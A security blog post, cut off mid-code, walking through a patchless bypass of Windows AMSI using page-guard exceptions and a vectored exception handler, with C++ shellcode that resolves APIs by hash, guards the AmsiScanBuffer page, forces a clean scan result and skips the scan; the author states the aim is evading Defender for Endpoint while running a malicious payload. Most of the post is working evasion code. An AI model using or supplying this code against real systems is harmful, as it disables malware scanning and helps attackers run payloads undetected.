# https://shigshag.com/blog/amsi_page_guard

<!DOCTYPE html><html lang="en"><body class="bg-neutral-950 text-neutral-200 antialiased selection:bg-indigo-500/30 selection:text-white min-h-screen flex flex-col relative overflow-x-hidden"><div class="fixed inset-0 z-0"><div class="grid-pattern absolute inset-0"></div><div class="bg-orb orb-1"></div><div class="bg-orb orb-2"></div><div class="bg-orb orb-3"></div></div><main class="flex-1 relative z-10">  <article class="mx-auto max-w-7xl px-6 lg:px-8 py-16"><h1 id="patchless-amsi-bypass-via-page-guard-exceptions">Patchless AMSI Bypass via Page Guard Exceptions</h1><p>In this blog, I talk about how to use <strong>Page Guard Exceptions</strong> to bypass AMSI. This technique leverages <strong>Page Guard Exceptions</strong> on the <code>AmsiScanBuffer</code> function and <strong>Vectored Exception Handlers (VEHs)</strong> to force an <strong>early return</strong> from the function before a full scan can occur. This proof-of-concept is implemented in both <strong>shellcode</strong> and an <strong>In PowerShell</strong> solution.</p><p>The source code is available on <a href="https://github.com/ShigShag/AMSI-Bypass-via-Page-Guard-Exceptions">GitHub</a>.</p><p>At the end of the blog we are going to patch AMSI and thus bypass Windows Defender for Endpoint, when executing a malicious payload inside PowerShell:</p><p><img src="https://shigshag.com/img/3.png"></p><h2 id="high-level-overview">High Level Overview</h2><p>This method works similar to <strong>Hardware Breakpoints</strong>. Both methods trigger an exception on <code>AmsiScanBuffer</code> which is then handled by a previous configured vectored exception handler. From there, the value of the <code>result</code> parameter is set to <code>AMSI_RESULT_CLEAN</code>. More importantly, the function is forced to return early, skipping the rest of the logic and thus evading an alert.</p><p>The <strong>Page Guard</strong> method is implemented in the following step-by-step manner (Assuming no other Page Guards are implemented):</p><ol type="1"><li>Register a <strong>Vectored Exception Handler</strong></li><li>Locate the memory address of <code>AmsiScanBuffer</code></li><li>Apply <code>PAGE_EXECUTE_READ | PAGE_GUARD</code> protection to the address<ul><li>This applies the protection to the entire memory page containing <code>AmsiScanBuffer</code>, which contrasts with <strong>Hardware Breakpoints</strong> that trigger the exception at the <strong>function’s starting address</strong></li></ul></li><li>Wait for an Exception of type <code>STATUS_GUARD_PAGE_VIOLATION</code><ol type="1"><li>If the origin is <code>AmsiScanBuffer</code> set the value of the 6. parameter <code>result</code> to <code>AMSI_RESULT_CLEAN</code> and emulate a <code>ret</code> by popping the return address from the stack and then loading that address into the <code>RIP</code> register to continue execution at the caller</li><li>In any case the <strong>Single Step Flag</strong> must be set. This will trigger a <code>STATUS_SINGLE_STEP</code> exception on the next instruction which must be used to <strong>reapply the page protection</strong> since it is removed after being triggered</li></ol></li></ol><p>As described, this method requires the usage of <strong>Single Step Flags</strong> after a <code>STATUS_GUARD_PAGE_VIOLATION</code> exception was triggered. This allows to handle a <code>STATUS_SINGLE_STEP</code> exception right after the <code>STATUS_GUARD_PAGE_VIOLATION</code> was handled. Using the same <strong>Vectored Exception Handler</strong> the memory page can then be re-protected with <code>PAGE_EXECUTE_READ | PAGE_GUARD</code></p><h2 id="shellcode-implementation">Shellcode implementation</h2><p>One option for bypassing AMSI is to inject position-independent code into PowerShell or other processes which use AMSI. The shellcode is implemented in C++. I won’t delve into the code and scripts that convert it to executable shellcode, but interested readers can explore the <a href="https://github.com/ShigShag/AMSI-Bypass-via-Page-Guard-Exceptions">Repository</a> and this <a href="https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design">blog by 5pider</a> introducing the <a href="https://github.com/Cracked5pider/Stardust">Stardust</a> shellcode template. While I don’t use his template, many features in my implementation were inspired by it.</p><h3 id="resolve-necessary-functions">Resolve necessary functions</h3><div class="sourceCode" id="cb1"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb1-1"><a href="https://shigshag.com/#cb1-1" aria-hidden="true" tabindex="-1"></a>DECL_SHELLCODE <span class="dt">int</span> main_logic<span class="op">()</span></span>
<span id="cb1-2"><a href="https://shigshag.com/#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb1-3"><a href="https://shigshag.com/#cb1-3" aria-hidden="true" tabindex="-1"></a>    <span class="co">// --- Resolve ntdll ---</span></span>
<span id="cb1-4"><a href="https://shigshag.com/#cb1-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">uintptr_t</span> ntdll_base <span class="op">=</span> resolver<span class="op">::</span>find_module<span class="op">(</span>W_HASH<span class="op">(</span><span class="st">L"ntdll.dll"</span><span class="op">));</span></span>
<span id="cb1-5"><a href="https://shigshag.com/#cb1-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-6"><a href="https://shigshag.com/#cb1-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>ntdll_base<span class="op">)</span></span>
<span id="cb1-7"><a href="https://shigshag.com/#cb1-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb1-8"><a href="https://shigshag.com/#cb1-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> EXIT_FAILURE<span class="op">;</span></span>
<span id="cb1-9"><a href="https://shigshag.com/#cb1-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb1-10"><a href="https://shigshag.com/#cb1-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-11"><a href="https://shigshag.com/#cb1-11" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Resolve functions we are going to use</span></span>
<span id="cb1-12"><a href="https://shigshag.com/#cb1-12" aria-hidden="true" tabindex="-1"></a>    api<span class="op">::</span><span class="dt">RtlAddVectoredExceptionHandler_t</span> RtlAddVectoredExceptionHandler <span class="op">=</span> resolver<span class="op">::</span>get_api<span class="op">&lt;</span>api<span class="op">::</span><span class="dt">RtlAddVectoredExceptionHandler_t</span><span class="op">&gt;(</span>ntdll_base<span class="op">,</span> C_HASH<span class="op">(</span><span class="st">"RtlAddVectoredExceptionHandler"</span><span class="op">));</span></span>
<span id="cb1-13"><a href="https://shigshag.com/#cb1-13" aria-hidden="true" tabindex="-1"></a>    api<span class="op">::</span><span class="dt">RtlRemoveVectoredExceptionHandler_t</span> RtlRemoveVectoredExceptionHandler <span class="op">=</span> resolver<span class="op">::</span>get_api<span class="op">&lt;</span>api<span class="op">::</span><span class="dt">RtlRemoveVectoredExceptionHandler_t</span><span class="op">&gt;(</span>ntdll_base<span class="op">,</span> C_HASH<span class="op">(</span><span class="st">"RtlRemoveVectoredExceptionHandler"</span><span class="op">));</span></span>
<span id="cb1-14"><a href="https://shigshag.com/#cb1-14" aria-hidden="true" tabindex="-1"></a>    api<span class="op">::</span><span class="dt">NtDelayExecution_t</span> NtDelayExecution <span class="op">=</span> resolver<span class="op">::</span>get_api<span class="op">&lt;</span>api<span class="op">::</span><span class="dt">NtDelayExecution_t</span><span class="op">&gt;(</span>ntdll_base<span class="op">,</span> C_HASH<span class="op">(</span><span class="st">"NtDelayExecution"</span><span class="op">));</span></span>
<span id="cb1-15"><a href="https://shigshag.com/#cb1-15" aria-hidden="true" tabindex="-1"></a>    api<span class="op">::</span><span class="dt">NtProtectVirtualMemory_t</span> NtProtectVirtualMemory <span class="op">=</span> resolver<span class="op">::</span>get_api<span class="op">&lt;</span>api<span class="op">::</span><span class="dt">NtProtectVirtualMemory_t</span><span class="op">&gt;(</span>ntdll_base<span class="op">,</span> C_HASH<span class="op">(</span><span class="st">"NtProtectVirtualMemory"</span><span class="op">));</span></span>
<span id="cb1-16"><a href="https://shigshag.com/#cb1-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-17"><a href="https://shigshag.com/#cb1-17" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>RtlAddVectoredExceptionHandler <span class="op">||</span> <span class="op">!</span>RtlRemoveVectoredExceptionHandler <span class="op">||</span> <span class="op">!</span>NtDelayExecution <span class="op">||</span> <span class="op">!</span>NtProtectVirtualMemory<span class="op">)</span></span>
<span id="cb1-18"><a href="https://shigshag.com/#cb1-18" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb1-19"><a href="https://shigshag.com/#cb1-19" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> EXIT_FAILURE<span class="op">;</span></span>
<span id="cb1-20"><a href="https://shigshag.com/#cb1-20" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb1-21"><a href="https://shigshag.com/#cb1-21" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-22"><a href="https://shigshag.com/#cb1-22" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span>
<span id="cb1-23"><a href="https://shigshag.com/#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>The above snippet dynamically resolves the necessary functions by parsing the PEB. Importantly, we cannot use the standard <code>AddVectoredExceptionHandler</code> and <code>RemoveVectoredExceptionHandler</code> exports from <code>kernel32.dll</code> because they are <em>forwarder exports</em> that redirect to their <code>Rtl</code> counterparts in <code>ntdll.dll</code>. Attempting to call the kernel32 versions directly would cause a crash, as they’re merely jump stubs to the actual implementations.</p><h3 id="wait-for-amsi-dll-to-be-loaded">Wait for AMSI dll to be loaded</h3><div class="sourceCode" id="cb2"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb2-1"><a href="https://shigshag.com/#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="co">// ...</span></span>
<span id="cb2-2"><a href="https://shigshag.com/#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-3"><a href="https://shigshag.com/#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="co">// Try to find amsi.dll in the current process</span></span>
<span id="cb2-4"><a href="https://shigshag.com/#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="dt">uintptr_t</span> amsi_base <span class="op">=</span> resolver<span class="op">::</span>find_module<span class="op">(</span>W_HASH<span class="op">(</span><span class="st">L"amsi.dll"</span><span class="op">));</span></span>
<span id="cb2-5"><a href="https://shigshag.com/#cb2-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-6"><a href="https://shigshag.com/#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="co">// Do not forcefully load Amsi into the process, wait until it was loaded by the process</span></span>
<span id="cb2-7"><a href="https://shigshag.com/#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="op">(</span>amsi_base <span class="op">==</span> <span class="dv">0</span><span class="op">)</span></span>
<span id="cb2-8"><a href="https://shigshag.com/#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb2-9"><a href="https://shigshag.com/#cb2-9" aria-hidden="true" tabindex="-1"></a>    amsi_base <span class="op">=</span> resolver<span class="op">::</span>find_module<span class="op">(</span>W_HASH<span class="op">(</span><span class="st">L"amsi.dll"</span><span class="op">));</span></span>
<span id="cb2-10"><a href="https://shigshag.com/#cb2-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-11"><a href="https://shigshag.com/#cb2-11" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Sleep for 100 MS</span></span>
<span id="cb2-12"><a href="https://shigshag.com/#cb2-12" aria-hidden="true" tabindex="-1"></a>    LARGE_INTEGER delay<span class="op">;</span></span>
<span id="cb2-13"><a href="https://shigshag.com/#cb2-13" aria-hidden="true" tabindex="-1"></a>    delay<span class="op">.</span>QuadPart <span class="op">=</span> <span class="op">-</span><span class="dv">1</span> <span class="op">*</span> <span class="op">(</span>LONGLONG<span class="op">)</span><span class="dv">100</span> <span class="op">*</span> <span class="dv">10000</span><span class="bu">LL</span><span class="op">;</span></span>
<span id="cb2-14"><a href="https://shigshag.com/#cb2-14" aria-hidden="true" tabindex="-1"></a>    NtDelayExecution<span class="op">(</span>FALSE<span class="op">,</span> <span class="op">&amp;</span>delay<span class="op">);</span></span>
<span id="cb2-15"><a href="https://shigshag.com/#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb2-16"><a href="https://shigshag.com/#cb2-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-17"><a href="https://shigshag.com/#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="co">// Find the address of AmsiScanBuffer</span></span>
<span id="cb2-18"><a href="https://shigshag.com/#cb2-18" aria-hidden="true" tabindex="-1"></a>PVOID p_AmsiScanBuffer <span class="op">=</span> <span class="op">(</span>PVOID<span class="op">)</span>resolver<span class="op">::</span>find_api<span class="op">(</span>amsi_base<span class="op">,</span> C_HASH<span class="op">(</span><span class="st">"AmsiScanBuffer"</span><span class="op">));</span></span>
<span id="cb2-19"><a href="https://shigshag.com/#cb2-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb2-20"><a href="https://shigshag.com/#cb2-20" aria-hidden="true" tabindex="-1"></a><span class="co">// ...</span></span></code></pre></div><p>To locate the address of <code>AmsiScanBuffer</code>, we must first find the base address of the AMSI module. If <code>amsi.dll</code> hasn’t been loaded into the process yet, the code enters a loop that checks every 100 milliseconds for its presence. While we could simply load the DLL ourselves using <code>LoadLibrary</code>, this approach is stealthier as it avoids creating additional module load events.</p><h3 id="register-vectored-exception-handler">Register vectored exception handler</h3><div class="sourceCode" id="cb3"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb3-1"><a href="https://shigshag.com/#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Register the exception handler</span></span>
<span id="cb3-2"><a href="https://shigshag.com/#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="dt">intptr_t</span> address_of_handler <span class="op">=</span> <span class="op">((</span><span class="dt">intptr_t</span><span class="op">)</span>get_shellcode_base<span class="op">()</span> <span class="op">+</span> get_function_offset<span class="op">((</span><span class="dt">void</span> <span class="op">*)</span>vectored_exception_handler<span class="op">));</span></span>
<span id="cb3-3"><a href="https://shigshag.com/#cb3-3" aria-hidden="true" tabindex="-1"></a>HANDLE h_vectored_exception_handler <span class="op">=</span> RtlAddVectoredExceptionHandler<span class="op">(</span><span class="dv">1</span><span class="op">,</span> <span class="op">(</span>PVECTORED_EXCEPTION_HANDLER<span class="op">)</span>address<span class="op">);</span></span>
<span id="cb3-4"><a href="https://shigshag.com/#cb3-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-5"><a href="https://shigshag.com/#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>h_vectored_exception_handler <span class="op">==</span> NULL<span class="op">)</span></span>
<span id="cb3-6"><a href="https://shigshag.com/#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb3-7"><a href="https://shigshag.com/#cb3-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> EXIT_FAILURE<span class="op">;</span></span>
<span id="cb3-8"><a href="https://shigshag.com/#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>This step registers the exception handler that will process both <em>Page Guard</em> and <em>Single Step</em> exceptions. The first parameter (<code>1</code>) positions our handler as the first in the exception handling chain, ensuring it receives exceptions before any existing handlers. The second parameter (<code>address</code>) is a pointer to our exception handler function. Since we’re working with custom shellcode that uses non-standard sections, we must calculate this address using the function’s relative offset from the shellcode base address. In a standard executable, we could simply reference the function directly.</p><div class="sourceCode" id="cb4"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb4-1"><a href="https://shigshag.com/#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">// In a normal program this would be sufficient</span></span>
<span id="cb4-2"><a href="https://shigshag.com/#cb4-2" aria-hidden="true" tabindex="-1"></a>HANDLE h_vectored_exception_handler <span class="op">=</span> RtlAddVectoredExceptionHandler<span class="op">(</span><span class="dv">1</span><span class="op">,</span> <span class="op">(</span>PVECTORED_EXCEPTION_HANDLER<span class="op">)</span>vectored_exception_handler<span class="op">);</span></span></code></pre></div><h3 id="change-the-memory-protection-of-amsiscanbuffer">Change the memory protection of AmsiScanBuffer</h3><div class="sourceCode" id="cb5"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb5-1"><a href="https://shigshag.com/#cb5-1" aria-hidden="true" tabindex="-1"></a>SIZE_T number_of_bytes_to_protect <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb5-2"><a href="https://shigshag.com/#cb5-2" aria-hidden="true" tabindex="-1"></a>DWORD old_protect<span class="op">;</span></span>
<span id="cb5-3"><a href="https://shigshag.com/#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(!</span>NT_SUCCESS<span class="op">(</span>NtProtectVirtualMemory<span class="op">(</span>NtCurrentProcess<span class="op">(),</span> <span class="op">&amp;</span>p_AmsiScanBuffer<span class="op">,</span> <span class="op">(</span>PULONG<span class="op">)&amp;</span>number_of_bytes_to_protect<span class="op">,</span> PAGE_EXECUTE_READ <span class="op">|</span> PAGE_GUARD<span class="op">,</span> <span class="op">&amp;</span>old_protect<span class="op">)))</span></span>
<span id="cb5-4"><a href="https://shigshag.com/#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb5-5"><a href="https://shigshag.com/#cb5-5" aria-hidden="true" tabindex="-1"></a>    RtlRemoveVectoredExceptionHandler<span class="op">(</span>h_vectored_exception_handler<span class="op">);</span></span>
<span id="cb5-6"><a href="https://shigshag.com/#cb5-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> EXIT_FAILURE<span class="op">;</span></span>
<span id="cb5-7"><a href="https://shigshag.com/#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb5-8"><a href="https://shigshag.com/#cb5-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-9"><a href="https://shigshag.com/#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="co">// At this point we can return this context since the rest is handled by the exception handler</span></span>
<span id="cb5-10"><a href="https://shigshag.com/#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span> EXIT_SUCCESS<span class="op">;</span></span></code></pre></div><p>In the final preparation step, we modify the memory protection of the page containing <code>AmsiScanBuffer</code> to <code>PAGE_EXECUTE_READ | PAGE_GUARD</code>. This triggers an exception on any access to the memory page, which our vectored exception handler will intercept. Although we specify only 1 byte in <code>number_of_bytes_to_protect</code>, <code>NtProtectVirtualMemory</code> automatically rounds the region to page boundaries. It rounds the starting address down to the nearest page and the size up to cover the full page.</p><p>Additionally, based on experience, using the <code>SIZE_T</code> data type (8 bytes) instead of <code>ULONG</code> (4 bytes) for this parameter proves more reliable, as the smaller type can lead to crashes and undefined behavior.</p><h3 id="implementing-the-vectored-exception-handler">Implementing the Vectored Exception Handler</h3><p>The handler we are going to use will handle <code>STATUS_GUARD_PAGE_VIOLATION</code> and <code>STATUS_SINGLE_STEP</code> exceptions. The first exception is caused by access to the protected memory page. The second one by setting the <em>Single Step Flag</em> when handling <code>STATUS_GUARD_PAGE_VIOLATION</code> exceptions.</p><div class="sourceCode" id="cb6"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb6-1"><a href="https://shigshag.com/#cb6-1" aria-hidden="true" tabindex="-1"></a>DECL_SHELLCODE LONG vectored_exception_handler<span class="op">(</span>PEXCEPTION_POINTERS ExceptionInfo<span class="op">)</span></span>
<span id="cb6-2"><a href="https://shigshag.com/#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb6-3"><a href="https://shigshag.com/#cb6-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>ExceptionInfo<span class="op">-&gt;</span>ExceptionRecord<span class="op">-&gt;</span>ExceptionCode <span class="op">==</span> STATUS_GUARD_PAGE_VIOLATION<span class="op">)</span></span>
<span id="cb6-4"><a href="https://shigshag.com/#cb6-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb6-5"><a href="https://shigshag.com/#cb6-5" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Resolve amsi.dll and AmsiScanBuffer</span></span>
<span id="cb6-6"><a href="https://shigshag.com/#cb6-6" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uintptr_t</span> amsi_base <span class="op">=</span> resolver<span class="op">::</span>find_module<span class="op">(</span>W_HASH<span class="op">(</span><span class="st">L"amsi.dll"</span><span class="op">));</span></span>
<span id="cb6-7"><a href="https://shigshag.com/#cb6-7" aria-hidden="true" tabindex="-1"></a>        PVOID pAmsiScanBuffer <span class="op">=</span> <span class="op">(</span>PVOID<span class="op">)</span>resolver<span class="op">::</span>find_api<span class="op">(</span>amsi_base<span class="op">,</span> C_HASH<span class="op">(</span><span class="st">"AmsiScanBuffer"</span><span class="op">));</span></span>
<span id="cb6-8"><a href="https://shigshag.com/#cb6-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-9"><a href="https://shigshag.com/#cb6-9" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Check if the violation is at AmsiScanBuffer</span></span>
<span id="cb6-10"><a href="https://shigshag.com/#cb6-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">((</span>UINT_PTR<span class="op">)</span>ExceptionInfo<span class="op">-&gt;</span>ExceptionRecord<span class="op">-&gt;</span>ExceptionAddress <span class="op">==</span> <span class="op">(</span>UINT_PTR<span class="op">)</span>pAmsiScanBuffer<span class="op">)</span></span>
<span id="cb6-11"><a href="https://shigshag.com/#cb6-11" aria-hidden="true" tabindex="-1"></a>        <span class="op">{</span></span>
<span id="cb6-12"><a href="https://shigshag.com/#cb6-12" aria-hidden="true" tabindex="-1"></a>            <span class="co">// Get the 6th parameter (AMSI_RESULT*) and set it to AMSI_RESULT_CLEAN</span></span>
<span id="cb6-13"><a href="https://shigshag.com/#cb6-13" aria-hidden="true" tabindex="-1"></a>            PVOID <span class="op">*</span>stack <span class="op">=</span> <span class="op">(</span>PVOID <span class="op">*)</span>ExceptionInfo<span class="op">-&gt;</span>ContextRecord<span class="op">-&gt;</span>Rsp<span class="op">;</span></span>
<span id="cb6-14"><a href="https://shigshag.com/#cb6-14" aria-hidden="true" tabindex="-1"></a>            AMSI_RESULT <span class="op">*</span>pAmsiResult <span class="op">=</span> <span class="op">(</span>AMSI_RESULT <span class="op">*)</span>stack<span class="op">[</span><span class="dv">6</span><span class="op">];</span></span>
<span id="cb6-15"><a href="https://shigshag.com/#cb6-15" aria-hidden="true" tabindex="-1"></a>            <span class="op">*</span>pAmsiResult <span class="op">=</span> AMSI_RESULT_CLEAN<span class="op">;</span></span>
<span id="cb6-16"><a href="https://shigshag.com/#cb6-16" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-17"><a href="https://shigshag.com/#cb6-17" aria-hidden="true" tabindex="-1"></a>            <span class="co">// Exit from function - pop return address and jump to it</span></span>
<span id="cb6-18"><a href="https://shigshag.com/#cb6-18" aria-hidden="true" tabindex="-1"></a>            PVOID retAddress <span class="op">=</span> <span class="op">*(</span>PVOID <span class="op">*)(</span>ExceptionInfo<span class="op">-&gt;</span>ContextRecord<span class="op">-&gt;</span>Rsp<span class="op">);</span></span>
<span id="cb6-19"><a href="https://shigshag.com/#cb6-19" aria-hidden="true" tabindex="-1"></a>            ExceptionInfo<span class="op">-&gt;</span>ContextRecord<span class="op">-&gt;</span>Rsp <span class="op">+=</span> <span class="kw">sizeof</span><span class="op">(</span>PVOID<span class="op">);</span></span>
<span id="cb6-20"><a href="https://shigshag.com/#cb6-20" aria-hidden="true" tabindex="-1"></a>            ExceptionInfo<span class="op">-&gt;</span>ContextRecord<span class="op">-&gt;</span>Rip <span class="op">=</span> <span class="op">(</span>ULONG_PTR<span class="op">)</span>retAddress<span class="op">;</span></span>
<span id="cb6-21"><a href="https://shigshag.com/#cb6-21" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb6-22"><a href="https://shigshag.com/#cb6-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-23"><a href="https://shigshag.com/#cb6-23" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Set single step flag to trigger single step exception for re-protection</span></span>
<span id="cb6-24"><a href="https://shigshag.com/#cb6-24" aria-hidden="true" tabindex="-1"></a>        ExceptionInfo<span class="op">-&gt;</span>ContextRecord<span class="op">-&gt;</span>EFlags <span class="op">|=</span> <span class="bn">0x100</span><span class="op">;</span></span>
<span id="cb6-25"><a href="https://shigshag.com/#cb6-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-26"><a href="https://shigshag.com/#cb6-26" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Right after this a STATUS_SINGLE_STEP exception will be triggered</span></span>
<span id="cb6-27"><a href="https://shigshag.com/#cb6-27" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> EXCEPTION_CONTINUE_EXECUTION<span class="op">;</span></span>
<span id="cb6-28"><a href="https://shigshag.com/#cb6-28" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb6-29"><a href="https://shigshag.com/#cb6-29" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-30"><a href="https://shigshag.com/#cb6-30" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Handle single step to reapply PAGE_GUARD</span></span>
<span id="cb6-31"><a href="https://shigshag.com/#cb6-31" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>ExceptionInfo<span class="op">-&gt;</span>ExceptionRecord<span class="op">-&gt;</span>ExceptionCode <span class="op">==</span> STATUS_SINGLE_STEP<span class="op">)</span></span>
<span id="cb6-32"><a href="https://shigshag.com/#cb6-32" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb6-33"><a href="https://shigshag.com/#cb6-33" aria-hidden="true" tabindex="-1"></a>        <span class="co">// ...</span></span>
<span id="cb6-34"><a href="https://shigshag.com/#cb6-34" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb6-35"><a href="https://shigshag.com/#cb6-35" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div><p>When intercepting a <code>STATUS_GUARD_PAGE_VIOLATION</code>, we must verify if the exception originated from <code>AmsiScanBuffer</code> by dynamically resolving its address each time, as global variables aren’t available in this shellcode context. If confirmed, we set the 6th parameter (the <code>AMSI_RESULT</code> output) to <code>AMSI_RESULT_CLEAN</code> to allow PowerShell to continue. However, this alone doesn’t prevent detection since <code>AmsiScanBuffer</code> still executes its scanning logic. To prevent the function from executing, we manipulate the stack frame by popping the return address into the <code>RIP</code> register to exit the function immediately.</p><p>Regardless of whether the exception occurred at <code>AmsiScanBuffer</code>, we must set the <em>Single Step Flag</em> in the <code>EFLAGS</code> register. This ensures a <code>STATUS_SINGLE_STEP</code> exception triggers after the next CPU instruction executes, which will be processed by the second part of our exception handler.</p><div class="sourceCode" id="cb7"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb7-1"><a href="https://shigshag.com/#cb7-1" aria-hidden="true" tabindex="-1"></a>DECL_SHELLCODE LONG vectored_exception_handler<span class="op">(</span>PEXCEPTION_POINTERS ExceptionInfo<span class="op">)</span></span>
<span id="cb7-2"><a href="https://shigshag.com/#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb7-3"><a href="https://shigshag.com/#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Handle PAGE_GUARD violation</span></span>
<span id="cb7-4"><a href="https://shigshag.com/#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>ExceptionInfo<span class="op">-&gt;</span>ExceptionRecord<span class="op">-&gt;</span>ExceptionCode <span class="op">==</span> STATUS_GUARD_PAGE_VIOLATION<span class="op">)</span></span>
<span id="cb7-5"><a href="https://shigshag.com/#cb7-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb7-6"><a href="https://shigshag.com/#cb7-6" aria-hidden="true" tabindex="-1"></a>        <span class="co">// ...</span></span>
<span id="cb7-7"><a href="https://shigshag.com/#cb7-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb7-8"><a href="https://shigshag.com/#cb7-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-9"><a href="https://shigshag.com/#cb7-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Handle single step to reapply PAGE_GUARD</span></span>
<span id="cb7-10"><a href="https://shigshag.com/#cb7-10" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>ExceptionInfo<span class="op">-&gt;</span>ExceptionRecord<span class="op">-&gt;</span>ExceptionCode <span class="op">==</span> STATUS_SINGLE_STEP<span class="op">)</span></span>
<span id="cb7-11"><a href="https://shigshag.com/#cb7-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb7-12"><a href="https://shigshag.com/#cb7-12" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Resolve necessary functions</span></span>
<span id="cb7-13"><a href="https://shigshag.com/#cb7-13" aria-hidden="true" tabindex="-1"></a>        <span class="dt">uintptr_t</span> ntdll_base <span class="op">=</span> resolver<span class="op">::</span>find_module<span class="op">(</span>W_HASH<span class="op">(</span><span class="st">L"ntdll.dll"</span><span class="op">));</span></span>
<span id="cb7-14"><a href="https://shigshag.com/#cb7-14" aria-hidden="true" tabindex="-1"></a>        api<span class="op">::</span><span class="dt">NtProtectVirtualMemory_t</span> NtProtectVirtualMemory <span class="op">=</span> resolver<span class="op">::</span>get_api<span class="op">&lt;</span>api<span class="op">::</span><span class="dt">NtProtectVirtualMemory_t</span><span class="op">&gt;(</span>ntdll_base<span class="op">,</span> C_HASH<span class="op">(</span><span class="st">"NtProtectVirtualMemory"</span><span class="op">));</span></span>
